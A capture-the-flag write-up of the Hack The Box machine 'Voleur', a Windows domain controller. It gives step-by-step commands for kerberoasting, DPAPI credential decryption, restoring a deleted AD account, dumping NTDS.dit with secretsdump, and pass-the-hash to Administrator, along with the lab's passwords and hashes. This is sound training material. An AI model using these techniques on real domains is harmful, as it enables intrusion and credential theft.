## About Voleur

**Name:** Voleur

**Machine:** https://app.hackthebox.com/machines/Voleur

**Difficulty:** Medium

**OS:** Windows

**Target IP:** 10.129.59.187

**Credentials:** `ryan.naylor: HollowOct31Nyt`

---
## Enumeration

We started, as always, with an Nmap scan to identify open ports and running services on the target:

```
nmap -sC -sV -oA Voleur 10.129.59.187 -v
```

The results immediately told us we were dealing with a Domain Controller:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-10 18:22:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
```

The presence of ports 88 (Kerberos), 389/3268 (LDAP), and 445 (SMB) together is a fingerprint of a Domain Controller. What stood out here, though, was port 2222 running OpenSSH on Ubuntu - an unusual addition for a Windows DC, and a strong hint that some kind of Linux subsystem or dual-boot/WSL setup was in play.

The scan also revealed the domain name (`voleur.htb`) and the hostname (`DC`), so we added both to our `/etc/hosts` file.

![](Assets/2026-08-10_15-54.png)

Just like in a real-world assessment, we were handed an initial set of credentials to start with `ryan.naylor:HollowOct31Nyt`.

Before touching anything, let's sync our clock with the DC. Kerberos is time-sensitive by design, if the clock skew between client and server exceeds the default tolerance (usually 5 minutes), the KDC will reject authentication outright, regardless of whether the credentials are correct. 

So we disabled our local NTP sync and pulled the time directly from the target:

```
sudo timedatectl set-ntp off 
sudo rdate -n 10.129.59.187 
```

With the clock synced, we tried authenticating to SMB with the provided credentials, and it failed with `STATUS_NOT_SUPPORTED`. This specific error is a strong indicator that NTLM authentication has been disabled on the domain - NetExec confirmed this for us by showing `NTLM:FALSE` in its output:

![](Assets/2026-08-10_15-53.png)

Since NTLM was off the table, we switched to Kerberos authentication using NetExec's `-k` flag, and this time authentication succeeded:

![](Assets/2026-08-10_15-59.png)

To make sure the rest of our tooling (Impacket, smbclient, etc.) would also authenticate via Kerberos correctly, we generated a `krb5.conf` file directly from NetExec and installed it system-wide:

```
nxc smb 10.129.59.168 --generate-krb5-file voluer.conf 
sudo cp voluer.conf /etc/krb5.conf
```

![](Assets/2026-08-10_16-02.png)

With Kerberos properly configured, we moved on to enumerating SMB shares:

```
nxc smb 10.129.59.187 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
```

This turned up three non-default shares `Finance`, `HR`, and `IT` and showed that `ryan.naylor` had read access to `IT`:

![](Assets/2026-08-10_16-03.png)

We connected to the `IT` share to see what was inside:

```
smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.voleur.htb/IT
```

Inside, we found a directory named `First-Line Support` containing a file called `Access_Review.xlsx`, which we downloaded for further analysis:

![](Assets/2026-08-10_16-28.png)

Opening the file locally prompted us for a password.

![](Assets/2026-08-10_16-48.png)

To get past this, we extracted a crackable hash from the file using `office2john` and ran it through John the Ripper:

```
python3 /usr/share/john/office2john.py Access_Review.xlsx > Access_Review.hash
john --wordlist=/usr/share/wordlists/rockyou.txt Access_Review.hash
```

![](Assets/2026-08-10_16-43.png)

With the recovered password, we reopened the spreadsheet and found a list of usernames alongside several plaintext passwords.

![](Assets/2026-08-10_17-07.png)

## Foothold

Next, I turned to BloodHound to map out the domain and look for a viable attack path:

```
bloodhound-python -u ryan.naylor -p HollowOct31Nyt -ns 10.129.59.187 -d voleur.htb -k -c all
zip -r voleur.zip *.json
```

`ryan.naylor` holds no meaningful privileges and wasn't a member of any interesting groups:

![](Assets/2026-08-10_17-09.png)

Digging further, though, we found that `svc_ldap` had some genuinely interesting outbound edges in the graph:

![](Assets/2026-08-10_18-02.png)

We also checked `Lacey.Miller`, who turned out to be a dead end, but `svc_winrm` stood out as a member of **Remote Management Users** - meaning we can authenticate as `svc_winrm` with WinRM, and therefore an interactive shell:

![](Assets/2026-08-10_18-06.png)

As `svc_ldap` has **WriteSPN** privileges over `svc_winrm`, we can perfrom a kerberoastable attack and if the password is weak, it can be cracked offline.

Let's use `svc_ldap`'s credentials (recovered from the spreadsheet) to set a fake SPN on `svc_winrm`:

```
bloodyad -k --host DC.voleur.htb -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set object svc_winrm servicePrincipalName -v 'fake/kerberoast' 
```

With the SPN in place, we requested the TGS for `svc_winrm`:

```
nxc ldap DC.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --kerberoasting svc_winrm.hash
```

![](Assets/2026-08-10_18-29.png)

We then cracked the extracted TGS hash offline:

```
john --wordlist=/usr/share/wordlists/rockyou.txt svc_winrm.hash
```

This successfully cracked to `AFireInsidedeOzarctica980219afi`:

![](Assets/2026-08-10_18-32.png)

The recovered credentials worked against SMB, but WinRM checks failed through NetExec - this is expected, since NetExec's WinRM check doesn't support Kerberos authentication, so a failure there doesn't necessarily mean the credentials are invalid:

![](Assets/2026-08-10_18-37.png)

Since BloodHound had already confirmed `svc_winrm` belonged to Remote Management Users, we requested a proper Kerberos TGT for the account and used it directly with `evil-winrm`:

```
impacket-getTGT voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi'
export KRB5CCNAME=svc_winrm.ccache
```

This gave us an authenticated WinRM session as `svc_winrm`, and from there we read the user flag:

![](Assets/2026-08-10_21-02.png)

## Privilege Escalation

`svc_winrm`'s home directory turned up nothing useful, and we didn't have access to any of the other local user profiles on the box:

![](Assets/2026-08-10_21-29.png)

Going back to the spreadsheet we'd cracked earlier, we noticed a note next to the user `Todd.Wolfe` indicating his account had been deleted:

![](Assets/2026-08-10_21-18.png)

Deleted AD accounts aren't necessarily gone - if the Active Directory Recycle Bin is enabled (or the tombstone lifetime hasn't expired), the object can be restored. Here, we used bloodyAD to restore this account:

```
bloodyad -k --host DC.voleur.htb -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set restore "Todd.Wolfe"
```

**Note:** There appears to be an automated reset script running on the box that periodically re-deletes or resets this account, so we occasionally had to re-run the restore command after a short wait.

Once restored, we authenticated successfully using `Todd.Wolfe`'s credentials from the spreadsheet:

![](Assets/2026-08-10_21-22.png)

Todd also has read access to the `IT` share:

![](Assets/2026-08-10_22-27.png)

We requested a TGT for Todd and used it to browse the SMB share:

```
impacket-getTGT 'voleur.htb/Todd.Wolfe':'NightT1meP1dg3on14'
export KRB5CCNAME=Todd.Wolfe.ccache
```

Now, we can access smb share's as Todd:
```
smbclient -U 'voleur.htb/Todd.Wolfe%NightT1meP1dg3on14' --realm=voleur.htb //dc.voleur.htb/IT
```

Enumerating further, we found Todd's old home directory:
```
smb: \> dir                                                                       
  .                                   D        0  Wed Jan 29 14:40:01 2025
  ..                                DHS        0  Fri Jul 25 01:39:59 2025
  Second-Line Support                 D        0  Wed Jan 29 20:43:03 2025
                                                                                                                                                                                                         
smb: \> cd "Second-Line Support"        
                                                                                                                            
smb: \Second-Line Support\> dir                                                                                                                                     
  .                                   D        0  Wed Jan 29 20:43:03 2025
  ..                                  D        0  Wed Jan 29 14:40:01 2025
  Archived Users                      D        0  Wed Jan 29 20:43:06 2025
    
smb: \Second-Line Support\> cd "Archived Users"
  
smb: \Second-Line Support\Archived Users\> dir                                                                                                               [0/499]
  .                                   D        0  Wed Jan 29 20:43:06 2025        
  ..                                  D        0  Wed Jan 29 20:43:03 2025        
  todd.wolfe                          D        0  Wed Jan 29 20:43:10 2025                                                                                          
                                                                                                               
smb: \Second-Line Support\Archived Users\> cd todd.wolfe

smb: \Second-Line Support\Archived Users\todd.wolfe\> dir                         
  .                                   D        0  Wed Jan 29 20:43:10 2025        
  ..                                  D        0  Wed Jan 29 20:43:06 2025        
  3D Objects                         DR        0  Wed Jan 29 20:43:06 2025                                                                                          
  AppData                            DH        0  Wed Jan 29 20:43:09 2025
  Contacts                           DR        0  Wed Jan 29 20:43:10 2025        
  Desktop                            DR        0  Thu Jan 30 19:58:50 2025
  Documents                          DR        0  Wed Jan 29 20:43:10 2025
  Downloads                          DR        0  Wed Jan 29 20:43:10 2025
  Favorites                          DR        0  Wed Jan 29 20:43:10 2025        
  Links                              DR        0  Wed Jan 29 20:43:10 2025
  Music                              DR        0  Wed Jan 29 20:43:10 2025        
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf    AHS    65536  Wed Jan 29 20:43:06 2025                                                                 
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Wed Jan 29 18:23:07 2025                            
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Wed Jan 29 18:23:07 2025                            
  ntuser.ini                        AHS       20  Wed Jan 29 18:23:07 2025
  Pictures                           DR        0  Wed Jan 29 20:43:10 2025
  Saved Games                        DR        0  Wed Jan 29 20:43:10 2025
  Searches                           DR        0  Wed Jan 29 20:43:10 2025        
  Videos                             DR        0  Wed Jan 29 20:43:10 2025                                                    
```

Poking around inside this old home directory, we found a DPAPI stored credentials and its corresponding master key file, so we pulled both down:

```
get "\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3"
get "\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88"
```

Windows' DPAPI (Data Protection API) encrypts saved credentials (like those stored by Credential Manager) using a per-user master key, which is itself encrypted with a key derived from the user's password. 

Since we had Todd's password, we can decrypt the master key first:

```
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
```

![](Assets/2026-08-10_22-41.png)

...and then use the decrypted master key to unlock the actual stored credential:

```
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key <MASTER_KEY>
```

This turned out to be a saved password for a user named `jeremy`:

![](Assets/2026-08-10_22-44.png)

I tried authenticating with these recovered credentials, and somewhat to our surprise - they were valid:

![](Assets/2026-08-10_22-49.png)

BloodHound showed that `jeremy` was a member of both **Remote Management Users** (meaning WinRM access) and a group called **Third-Line Technician**:

![](Assets/2026-08-10_22-56.png)

We requested a TGT for Jeremy:

```
impacket-getTGT 'voleur.htb/jeremy.combs':'qT3V9pLXyN7W4m'
export KRB5CCNAME=jeremy.combs.ccache
```

Then, we connected as `jeremy` via `evil-winrm`:

```
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
```

As `jeremy`, we had access to a `Third-Line Support` folder inside the `IT` share:

![](Assets/2026-08-10_23-33.png)

We couldn't access the `Backups` subfolder from this account, but we did find and read a file named `Note.txt.txt`:

![](Assets/2026-08-10_23-36.png)

Recalling that our initial Nmap scan had shown an SSH service on port 2222, and noticing an `id_rsa` private key sitting in the current directory, I tried using it to connect over SSH:

```
ssh -i id_rsa jeremy.combs@10.129.59.187 -p 2222
```

This was refused with a permission denied error :(

![](Assets/2026-08-10_23-43.png)

I checked who the key actually belonged to by dumping its public fingerprint/owner information with `ssh-keygen`:

```
ssh-keygen -y -f ./id_rsa
```

![](Assets/2026-08-11_00-05.png)

This revealed the key belonged to a different account than we'd assumed. Using the correct associated username, we logged in successfully:

![](Assets/2026-08-11_00-07.png)

Once inside, we found the Windows C: drive mounted at `/mnt/c` - confirming our earlier suspicion that this box was running some form of WSL or a similar Linux-on-Windows integration:

```
svc_backup@DC:/mnt/c$ ls

ls: cannot access 'DumpStack.log.tmp': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
'$Recycle.Bin'   Config.Msi                DumpStack.log.tmp   HR   PerfLogs        'Program Files (x86)'   Recovery                     Users     inetpub
'$WinREAgent'   'Documents and Settings'   Finance             IT  'Program Files'   ProgramData           'System Volume Information'   Windows   pagefile.sys
```

This time, as `svc_backup`, we could access the `Backups` directory that `jeremy` had been denied:

![](Assets/2026-08-11_00-27.png)

Inside, we found registry hive backups and Active Directory database files - exactly what we needed for a full domain compromise:

![](Assets/2026-08-11_00-28.png)

I pulled these files down to my local machine:

```
scp -i id_rsa -P 2222 svc_backup@10.129.59.187:/mnt/c/IT/Third-Line\ Support/Backups/registry/* .
scp -i id_rsa -P 2222 svc_backup@10.129.59.187:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* . 
```

With copies of `SECURITY`, `SYSTEM`, and `NTDS.dit`, we can use `secretsdump` in local mode to extract credentials offline:

```
impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit LOCAL
```

This recovered the NTLM hash for the built-in Administrator account:

![](Assets/2026-08-11_00-33.png)

With the Administrator's NTLM hash, we requested a Kerberos TGT using the hash directly:

```
impacket-getTGT voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc-ip 10.129.59.187
export KRB5CCNAME=administrator.ccache
```

Finally, we used this ticket to connect with `evil-winrm` as Administrator:

```
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
```

From there, we read the root flag and completed the machine

![](Assets/2026-08-11_00-47.png)

---